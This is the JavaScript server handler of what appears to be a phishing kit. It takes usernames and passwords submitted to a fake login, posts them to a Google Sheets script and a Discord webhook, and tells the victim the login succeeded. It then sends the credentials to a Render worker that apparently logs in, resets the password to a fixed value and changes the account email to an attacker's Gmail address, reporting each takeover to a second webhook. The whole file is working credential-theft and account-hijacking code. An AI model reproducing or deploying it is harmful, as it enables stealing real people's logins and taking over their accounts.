const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbwdAIV40A4sC9SWsIyXKC6uMJcgF1MGL6im_Vq9uxZT6HhHdS7CI5xUxFCLUzMLiKqPZw/exec";
const DISCORD_CREDS_WEBHOOK = "https://discord.com/api/webhooks/1480093421698940959/Z80mCRx5PykLaA29XwF7_Nxdl3QeqxRiyU380RbVpXc1nD-5Hb1lokk8-8Qzwle6kZtS";
const DISCORD_SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1480118694674956329/n8r1xhEf1Xyw7fUE33LlBF1PS2IRyFRboW6E-U78DkzIAMGxLzK0Bx7VYHy3cgYAyhCf";

const RENDER_WORKER_URL = "https://cwscrp-1.onrender.com";
const NEW_PASSWORD = "123aaa";
const NEW_EMAIL = "cuentadewapp1@gmail.com";

async function sendToSheet(tab, data) {
  try {
    await fetch(GOOGLE_SHEET_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ tab, ...data }),
    });
  } catch (e) {
    console.error("Sheet error:", e.message);
  }
}

async function sendToDiscord(webhookUrl, content) {
  if (!webhookUrl) return;
  try {
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content }),
    });
  } catch (e) {
    console.error("Discord error:", e.message);
  }
}

export default async function handler(req, res) {
  const { username, password, remember_me, timestamp } = req.query;

  if (!username || !password) {
    return res.status(400).json({ login_status: "error" });
  }

  // 1. Save creds to Google Sheets + Discord immediately
  await sendToSheet("creds", {
    username,
    password,
    remember_me: remember_me || "",
    timestamp: timestamp || "",
    login_status: "pending",
    login_error: "",
  });

  await sendToDiscord(DISCORD_CREDS_WEBHOOK,
    `**[CREDS]** \`${username}\` / \`${password}\` | Sending to worker...`
  );

  // 2. Return success immediately so the user gets redirected
  res.status(200).json({ login_status: "success" });

  // 3. Call Render worker and send Discord success from Vercel (not Render)
  try {
    const workerResp = await fetch(`${RENDER_WORKER_URL}/process`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password, timestamp: timestamp || "" }),
    });
    const result = await workerResp.json();
    console.log("Worker result:", result);

    if (result.loginStatus === "success" && result.changePassStatus === "success") {
      const emailNote = result.changeEmailStatus === "success" ? "YES" : "FAILED";
      await sendToDiscord(DISCORD_SUCCESS_WEBHOOK,
        `**[SUCCESS]** \`${username}\` | Old: \`${password}\` | New: \`${NEW_PASSWORD}\` | Email: ${emailNote}`
      );
    }
  } catch (e) {
    console.error("Worker call error:", e.message);
  }
}
